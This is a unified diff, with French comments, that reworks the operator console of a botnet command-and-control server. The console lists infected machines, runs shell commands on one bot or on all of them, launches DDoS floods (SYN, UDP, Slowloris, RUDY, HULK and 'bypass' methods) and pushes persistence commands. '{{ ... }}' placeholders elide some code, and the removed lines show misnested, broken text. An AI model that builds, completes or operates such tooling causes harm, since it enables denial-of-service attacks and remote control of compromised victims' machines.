@@ -268,32 +268,154 @@ def broadcast_command(command):
     
     # Afficher uniquement si demandé explicitement dans la commande broadcast
     if "verbose" in command.lower():
-        print(f"[+] Commande envoyée à {success_count}/{len(bot_info)} bots")
-        
-        elif cmd_parts[0] == "persist":
-            print("[+] Envoi des commandes de persistance à tous les bots...")
-            broadcast_command(f"PERSIST {RECONNECT_INTERVAL}")
-        
-        elif cmd_parts[0] == "help" or cmd_parts[0] == "?":
-            print("\n=== Commandes disponibles ===")
-            print("bots - Affiche la liste des bots connectés")
-            print("info <id> - Affiche les informations détaillées d'un bot")
-            print("cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
-            print("broadcast <commande> - Exécute une commande shell sur tous les bots")
-            print("ddos <id> <cible> <durée> [méthode] - Lance une attaque DDoS depuis un bot spécifique")
-            print("ddos -1 <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
-            print("ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
-            print("methods - Affiche les méthodes d'attaque DDoS disponibles")
-            print("persist - Envoie des commandes de persistance à tous les bots")
-            print("status - Affiche le statut du botnet")
-            print("clear - Efface l'écran")
-            print("exit - Quitte le programme")
+        print(f"[+] Commande envoyée à {success_count}/{len(active_device_ids)} bots")
+    
+    return success_count
+
+# Afficher la bannière du serveur C2
+def print_banner():
+    banner = """
+    ____        _            _     ____ ____  
+   | __ )  ___ | |_ _ __   ___| |_  / ___|___ \ 
+   |  _ \ / _ \| __| '_ \ / _ \ __|| |     __) |
+   | |_) | (_) | |_| | | |  __/ |_ | |___ / __/ 
+   |____/ \___/ \__|_| |_|\___|\__(_)____|_____|  
+                                                
+    """
+    print(banner)
+    print("=== Serveur de Commande et Contrôle ===\n")
+
+# Interface utilisateur du serveur C2
+def command_interface():
+    """Interface utilisateur pour contrôler les bots"""
+    print_banner()
+    
+    while True:
         # Afficher uniquement le nombre de bots et les attaques actives - information essentielle
-        print(f"\n[*] {len(bot_info)} bots | {active_ddos} attaques DDoS actives")
+        active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
+                           if bot_data.get('active', True)]
+        print(f"\n[*] {len(active_device_ids)} bots | {active_ddos} attaques DDoS actives")
         
         cmd = input("\n> ")
         cmd_parts = cmd.strip().split()
-{{ ... }}
+        
+        if not cmd_parts:
+            continue
+        
+        # Traiter les commandes
+        if cmd_parts[0] == "bots":
+            with lock:
+                if not bot_info:
+                    print("[*] Aucun bot connecté")
+                else:
+                    print("\n=== Bots connectés ===")
+                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
+                                       if bot_data.get('active', True)]
+                    for i, device_id in enumerate(active_device_ids):
+                        bot = bot_info[device_id]
+                        print(f"{i}. ID: {device_id[:10]}... | IP: {bot['ip']} | Connecté depuis: {bot['connected_time']}")
+                    print(f"Total: {len(active_device_ids)}")
+        
+        elif cmd_parts[0] == "info" and len(cmd_parts) > 1:
+            try:
+                bot_index = int(cmd_parts[1])
+                with lock:
+                    # Créer une liste temporaire des device_ids actifs
+                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
+                                       if bot_data.get('active', True)]
+                    
+                    if bot_index < 0 or bot_index >= len(active_device_ids):
+                        print("[!] Index de bot invalide")
+                    else:
+                        device_id = active_device_ids[bot_index]
+                        bot = bot_info[device_id]
+                        print(f"\n=== Informations du bot {bot_index} ===")
+                        print(f"ID unique: {device_id}")
+                        print(f"IP: {bot['ip']}")
+                        print(f"Architecture: {bot['arch']}")
+                        print(f"Hostname: {bot['hostname']}")
+                        print(f"Connecté depuis: {bot['connected_time']}")
+                        print(f"Persistance confirmée: {'Oui' if bot.get('persistence_confirmed', False) else 'Non'}")
+                        print(f"Reconnexions: {bot.get('reconnect_count', 0)}")
+                        print(f"Informations système:\n{bot['system_info']}")
+                        print(f"Tâches récentes: {', '.join(bot.get('tasks', [])[-5:]) if bot.get('tasks') else 'Aucune'}")
+            except ValueError:
+                print("[!] Index de bot invalide")
+        
+        elif cmd_parts[0] == "cmd" and len(cmd_parts) > 2:
+            try:
+                bot_index = int(cmd_parts[1])
+                command = ' '.join(cmd_parts[2:])
+                send_command_to_bot(bot_index, f"CMD {command}")
+                print(f"[+] Commande envoyée au bot {bot_index}")
+            except ValueError:
+                print("[!] Format invalide. Utilisez: cmd <id> <commande>")
+        
+        elif cmd_parts[0] == "broadcast" and len(cmd_parts) > 1:
+            command = ' '.join(cmd_parts[1:])
+            count = broadcast_command(f"CMD {command}")
+            print(f"[+] Commande envoyée à {count} bots")
+        
+        elif cmd_parts[0] == "ddos" and len(cmd_parts) >= 4:
+            try:
+                bot_index = int(cmd_parts[1])
+                target = cmd_parts[2]
+                duration = cmd_parts[3]
+                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
+                
+                if ":" not in target:
+                    target = f"{target}:80"  # Port par défaut si non spécifié
+                
+                # Vérifier si la méthode est valide
+                if method.lower() not in DDOS_METHODS:
+                    print(f"[!] Méthode d'attaque inconnue: {method}")
+                    print(f"Méthodes disponibles: {', '.join(DDOS_METHODS.keys())}")
+                    continue
+                
+                # Créer une liste temporaire des device_ids actifs
+                with lock:
+                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
+                                       if bot_data.get('active', True)]
+                    
+                    if not active_device_ids:
+                        print("[!] Aucun bot connecté")
+                        continue
+                
+                # Lancer l'attaque dans un thread séparé pour ne pas bloquer l'interface
+                if bot_index == -1:  # Attaque par tous les bots
+                    # Créer un thread pour l'attaque DDoS
+                    ddos_thread = threading.Thread(
+                        target=lambda: broadcast_command(f"DDOS {target} {duration} {method}"),
+                        daemon=True
+                    )
+                    ddos_thread.start()
+                    print(f"[+] Attaque DDoS lancée contre {target} pour {duration}s en utilisant la méthode {method}")
+                    active_ddos += 1
+                else:
+                    # Vérifier si l'index est valide
+                    with lock:
+                        if bot_index < 0 or bot_index >= len(active_device_ids):
+                            print("[!] Index de bot invalide")
+                            continue
+                    
+                    # Créer un thread pour l'attaque DDoS
+                    ddos_thread = threading.Thread(
+                        target=lambda: send_command_to_bot(bot_index, f"DDOS {target} {duration} {method}"),
+                        daemon=True
+                    )
+                    ddos_thread.start()
+                    print(f"[+] Attaque DDoS lancée contre {target} pour {duration}s en utilisant la méthode {method}")
+                    active_ddos += 1
+            except ValueError:
+                print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
+                print("Pour attaquer avec tous les bots, utilisez: ddos -1 <cible> <durée> [méthode]")
+        
+        elif cmd_parts[0] == "ddos-all" and len(cmd_parts) >= 3:
+            target = cmd_parts[1]
+            duration = cmd_parts[2]
+            method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
+            
+            if ":" not in target:
                 target = f"{target}:80"  # Port par défaut si non spécifié
             
             # Vérifier si la méthode est valide
@@ -317,20 +439,23 @@ def broadcast_command(command):
             print(f"[+] Attaque DDoS lancée depuis tous les bots vers {target} pour {duration}s (méthode: {method})")
             active_ddos += 1
         
-        elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
-            try:
-                bot_index = int(cmd_parts[1])
-                subnet = cmd_parts[2]
-{{ ... }}
+        elif cmd_parts[0] == "persist":
+            print("[+] Envoi des commandes de persistance à tous les bots...")
+            broadcast_command(f"PERSIST {RECONNECT_INTERVAL}")
         
-        elif cmd_parts[0] == "kill" and len(cmd_parts) > 1:
-            try:
-                bot_index = int(cmd_parts[1])
-                send_command_to_bot(bot_index, "EXIT")
-                elif cmd_parts[0] == "methods":
+        elif cmd_parts[0] == "methods":
             print("\n=== Méthodes d'attaque DDoS disponibles ===")
-            for method, description in DDOS_METHODS.items():
-                print(f"{method}: {description}")
+            print("\nLayer 4 (Transport):")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["syn", "ack", "udp", "tcp", "icmp"]}.items():
+                print(f"- {method}: {desc}")
+            
+            print("\nLayer 7 (Application):")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["http", "slowloris", "rudy", "arme", "hulk"]}.items():
+                print(f"- {method}: {desc}")
+            
+            print("\nMixtes:")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["mix", "bypass"]}.items():
+                print(f"- {method}: {desc}")
         
         elif cmd_parts[0] == "clear":
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -352,14 +477,21 @@ def broadcast_command(command):
                 print(f"Infections totales: {total_infections}")
                 print(f"Commandes exécutées: {total_commands}")
                 print(f"Attaques DDoS actives: {active_ddos}")
-            
-            print("\nLayer 7 (Application):")
-            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["http", "slowloris", "rudy", "arme", "hulk"]}.items():
-                print(f"- {method}: {desc}")
-            
-{{ ... }}
-            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["mix", "bypass"]}.items():
-                print(f"- {method}: {desc}")
+        
+        elif cmd_parts[0] == "help" or cmd_parts[0] == "?":
+            print("\n=== Commandes disponibles ===")
+            print("bots - Affiche la liste des bots connectés")
+            print("info <id> - Affiche les informations détaillées d'un bot")
+            print("cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
+            print("broadcast <commande> - Exécute une commande shell sur tous les bots")
+            print("ddos <id> <cible> <durée> [méthode] - Lance une attaque DDoS depuis un bot spécifique")
+            print("ddos -1 <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
+            print("ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
+            print("methods - Affiche les méthodes d'attaque DDoS disponibles")
+            print("persist - Envoie des commandes de persistance à tous les bots")
+            print("status - Affiche le statut du botnet")
+            print("clear - Efface l'écran")
+            print("exit - Quitte le programme")
         
         elif cmd_parts[0] == "exit":
             print("[!] Arrêt du serveur...")
@@ -440,11 +572,12 @@ def main():
     finally:
         # Ferme toutes les connexions
         with lock:
-            for bot in connected_bots:
-                try:
-                    bot['socket'].close()
-                except:
-                    pass
+            for device_id, bot in bot_info.items():
+                if 'socket' in bot and bot['socket']:
+                    try:
+                        bot['socket'].close()
+                    except:
+                        pass
         
         server.close()
 
